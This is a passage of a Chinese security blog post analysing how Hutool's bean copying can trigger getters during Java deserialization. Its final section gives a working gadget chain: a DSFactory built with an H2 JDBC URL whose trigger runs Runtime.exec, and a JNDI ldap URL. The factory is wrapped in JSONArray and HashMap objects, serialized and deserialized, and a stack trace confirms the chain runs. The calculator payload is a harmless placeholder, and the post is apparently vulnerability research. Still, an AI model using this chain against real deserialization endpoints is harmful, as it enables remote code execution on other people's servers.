+<p>主要就是这个copy方，它会调用下面这个方法。</p>
+<p>cn.hutool.core.bean.copier.BeanToMapCopier#copy</p>
+<p><img src="image-20241125164544382.png" srcset="/img/loading.gif" lazyload alt="image-20241125164544382"></p>
+<p><img src="image-20241125164707597.png" srcset="/img/loading.gif" lazyload alt="image-20241125164707597"></p>
+<p>它会获取我们传入类的fied，以及对应的getter，setter方法。</p>
+<p>最最最最坑的地方到了</p>
+<p>cn.hutool.core.bean.PropDesc#isReadable</p>
+<p><img src="image-20241125165018000.png" srcset="/img/loading.gif" lazyload alt="image-20241125165018000"></p>
+<p>它会调用这个傻逼方法判断这个fied是不是public，有没有对应的getter方法,还判断了fied是不是TRANSIENT修饰，超级无语了，进不去就触发不了getter。</p>
+<p>如果幸运走到里面，那么就来到触发点了</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sDesc.getValue<br></code></pre></td></tr></table></figure>
+
+<p><img src="image-20241125165249895.png" srcset="/img/loading.gif" lazyload alt="image-20241125165249895"></p>
+<p><img src="image-20241125165323841.png" srcset="/img/loading.gif" lazyload alt="image-20241125165323841"></p>
+<p>无参数getter方法。</p>
+<p>已上感觉，就是限制的太死了，暂时想不到能用hutool做gadget去触发getter。太难了，主要这傻逼是fied的前面加get，还有public，说实话很难利用。</p>
+<h3 id="0x04-测试demo"><a href="#0x04-测试demo" class="headerlink" title="0x04 测试demo"></a>0x04 测试demo</h3><p>其实通过以上分析，不让发现触发点事new JSONObject，这样就可以绕调限制原生jdk的类了。</p>
+<h4 id="template"><a href="#template" class="headerlink" title="template"></a>template</h4><p>直接写一个template测试</p>
+<p><img src="image-20241125165924271.png" srcset="/img/loading.gif" lazyload alt="image-20241125165924271"></p>
+<p><img src="image-20241125170054145.png" srcset="/img/loading.gif" lazyload alt="image-20241125170054145"></p>
+<p>来到 BeanUtil.getBeanDesc(actualEditable).getPropMap(this.copyOptions.ignoreCase)</p>
+<p>可以看到获取template所有fied，但是这些fied是有没有对应的setter，getter方法<img src="image-20241125170223657.png" srcset="/img/loading.gif" lazyload alt="image-20241125170223657"></p>
+<p>)</p>
+<p><img src="image-20241125170433728.png" srcset="/img/loading.gif" lazyload alt="image-20241125170433728"></p>
+<p>然后最绝望的是都是private, 且没后propdesc描述，过不了判断。 根本无法用来组gadget。</p>
+<h4 id="LdapAttribute"><a href="#LdapAttribute" class="headerlink" title="LdapAttribute"></a>LdapAttribute</h4><p><img src="image-20241125171325587.png" srcset="/img/loading.gif" lazyload alt="image-20241125171325587"></p>
+<p>在来个列子</p>
+<p><img src="image-20241125171356632.png" srcset="/img/loading.gif" lazyload alt="image-20241125171356632"></p>
+<p>可以看到，他获取到了是当前类和父类的fied，然后获取propdesc。 并没有获取到getAttributeSyntaxDefinition, 没有这个fied，真是够绝望。</p>
+<h4 id="cn-hutool-db-ds-DSFactory"><a href="#cn-hutool-db-ds-DSFactory" class="headerlink" title="cn.hutool.db.ds.DSFactory"></a>cn.hutool.db.ds.DSFactory</h4><p>目前最有希望的就是这个</p>
+<p><img src="image-20241125172920415.png" srcset="/img/loading.gif" lazyload alt="image-20241125172920415"></p>
+<p><img src="image-20241125172948428.png" srcset="/img/loading.gif" lazyload alt="image-20241125172948428"></p>
+<p>可是这里获取不到getter方法，没有对应的propdesc描述，真的无语，</p>
+<p><img src="image-20241125173044585.png" srcset="/img/loading.gif" lazyload alt="image-20241125173044585"></p>
+<p>不知道为什么获取不到，真的傻逼。因为没有对应的getter方法，以及dataSourceName是protected，导致过不了isReadable的判断。</p>
+<p>无法走到sDesc.getValue(this.source)</p>
+<p><img src="image-20241125174618090.png" srcset="/img/loading.gif" lazyload alt="image-20241125174618090"></p>
+<p>最后打计算器模拟走进去，是能正常触发的。以上，what can i say</p>
+<p>总结，要想利用成功，需要触发getter调用的方法有对应的fied，fied不能TRANSIENT修饰，且有propdesc描述，采用调用的希望。</p>
+<h3 id="0x05-hutool-gadget"><a href="#0x05-hutool-gadget" class="headerlink" title="0x05 hutool gadget"></a>0x05 hutool gadget</h3><p>cn.hutool.db.ds.DSFactory</p>
+<p><img src="image-20241125174859482.png" srcset="/img/loading.gif" lazyload alt="image-20241125174859482"></p>
+<p>它会调用getDataSource，看他的实现类</p>
+<p>cn.hutool.db.ds.AbstractDSFactory#getDataSource</p>
+<p><img src="image-20241125175021881.png" srcset="/img/loading.gif" lazyload alt="image-20241125175021881"></p>
+<p>创建jdbc连接</p>
+<p>他是一个抽象类，看一下实现</p>
+<p><img src="image-20241125175048477.png" srcset="/img/loading.gif" lazyload alt="image-20241125175048477"></p>
+<p>这里有9个，其中6类需要系统有依赖才能使用，<img src="image-20241125175138760.png" srcset="/img/loading.gif" lazyload alt="image-20241125175138760"></p>
+<p>应该构造函数会调用。</p>
+<p>在只有hutool的情况下，我们可以使用这三个类进行处罚jdbc&#x2F;jndi 攻击</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DSFactory DSFactory;<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDSFactory</span>(setting);<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PooledDSFactory</span>(setting);<br>DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiDSFactory</span>(setting);<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="image-20241125175341607.png" srcset="/img/loading.gif" lazyload alt="image-20241125175341607"></p>
+<p>他们都需要传一个seting进行构造</p>
+<p><img src="image-20241125175607923.png" srcset="/img/loading.gif" lazyload alt="image-20241125175607923"></p>
+<p>我们只要配置jdbcurl就行。</p>
+<p><img src="image-20241125175648313.png" srcset="/img/loading.gif" lazyload alt="image-20241125175648313"></p>
+<p>在使用JndiDSFactory要配置jndi。</p>
+<p>最后构造就是如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>        <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>        <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a Calculator&#x27;)\n&quot;</span> +<br>        <span class="hljs-string">&quot;$$\n&quot;</span>;<br><span class="hljs-type">Setting</span> <span class="hljs-variable">setting</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Setting</span>();<br>setting.setCharset(<span class="hljs-literal">null</span>);<br>setting.set(<span class="hljs-string">&quot;url&quot;</span>, JDBC_URL);<br>setting.set(<span class="hljs-string">&quot;jndi&quot;</span>, <span class="hljs-string">&quot;ldap://127.0.0.1:80/Object&quot;</span>);<br>DSFactory DSFactory;<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDSFactory</span>(setting);<br> DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PooledDSFactory</span>(setting);<br>DSFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiDSFactory</span>(setting);<br><br><br><span class="hljs-type">JSONArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>array.add(DSFactory);<br><br><span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> utils.maskmapToString(array, array);<br>utils.unserialize(utils.serialize(hashMap));<br></code></pre></td></tr></table></figure>
+
+<p>JDBC_URL换任意jdbc都行，</p>
+<p><img src="image-20241125180131520.png" srcset="/img/loading.gif" lazyload alt="image-20241125180131520"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">at cn.hutool.db.DbUtil.getJndiDs(DbUtil.java:<span class="hljs-number">167</span>)<br>at cn.hutool.db.ds.jndi.JndiDSFactory.createDataSource(JndiDSFactory.java:<span class="hljs-number">41</span>)<br>at cn.hutool.db.ds.AbstractDSFactory.createDataSource(AbstractDSFactory.java:<span class="hljs-number">122</span>)<br>at cn.hutool.db.ds.AbstractDSFactory.getDataSource(AbstractDSFactory.java:<span class="hljs-number">82</span>)<br>at cn.hutool.db.ds.DSFactory.getDataSource(DSFactory.java:<span class="hljs-number">62</span>)<br>at com.alibaba.fastjson.serializer.ASMSerializer_1_JndiDSFactory.write(Unknown Source)<br>at com.alibaba.fastjson.serializer.ListSerializer.write(ListSerializer.java:<span class="hljs-number">137</span>)<br>at com.alibaba.fastjson.serializer.JSONSerializer.write(JSONSerializer.java:<span class="hljs-number">275</span>)<br>at com.alibaba.fastjson.JSON.toJSONString(JSON.java:<span class="hljs-number">863</span>)<br>at com.alibaba.fastjson.JSON.toString(JSON.java:<span class="hljs-number">857</span>)<br>at javax.swing.UIDefaults$TextAndMnemonicHashMap.get(UIDefaults.java:<span class="hljs-number">1250</span>)<br>at java.util.AbstractMap.equals(AbstractMap.java:<span class="hljs-number">469</span>)<br>at java.util.HashMap.putVal(HashMap.java:<span class="hljs-number">634</span>)<br>at java.util.HashMap.readObject(HashMap.java:<span class="hljs-number">1397</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>最后。下版本加入<a target="_blank" rel="noopener" href="https://github.com/Java-Chains/web-chains">web-chains</a></p>
+<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/">http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14190">https://xz.aliyun.com/t/14190</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Java-Chains/web-chains">https://github.com/Java-Chains/web-chains</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>hutool序列化分析及gadget浅析</div>
+      <div>https://unam4.github.io/2024/11/25/hutool序列化分析及gadget浅析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年11月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/15/geoserver%E7%BB%95waf%E5%B0%9D%E8%AF%95/" title="geoserver绕waf尝试到学习jxpath">
+                        <span class="hidden-mobile">geoserver绕waf尝试到学习jxpath</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
